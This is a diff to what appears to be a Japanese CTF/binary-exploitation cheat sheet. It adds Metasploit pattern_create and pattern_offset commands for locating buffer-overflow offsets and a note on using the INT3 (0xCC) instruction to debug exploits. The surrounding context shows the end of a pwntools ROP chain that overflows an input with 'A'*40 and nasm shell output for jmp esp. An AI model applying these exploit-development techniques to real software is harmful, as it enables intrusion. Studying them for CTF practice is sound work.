@@ -2100,7 +2100,9 @@ print(rop.dump())
 # 0x0020:   0x7ffff7ac8fa0 execv
 conn.sendlineafter("ID: ", "A"*40 + rop.chain() )
 ```
-#### nasm
+#### metasploit
+`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4000`   
+`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 336e4532`   
 `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb `   
 ```txt
 nasm > jmp $+17
@@ -2109,6 +2111,8 @@ nasm > call $-0d
 00000000  E8FBFFFFFF        call 0x0 <- リターンアドレスをセットしてjmpと同様に相対アドレスにjmp
 nasm > jmp esp
 00000000  FFE4              jmp esp
+
+0xCC INT3       <- この命令を実行後ブレークする。Exploit書く時のデバッグに使える 
 ```
 #### alarmのbypass
 `hexedit`でバイナリを書き換える。   
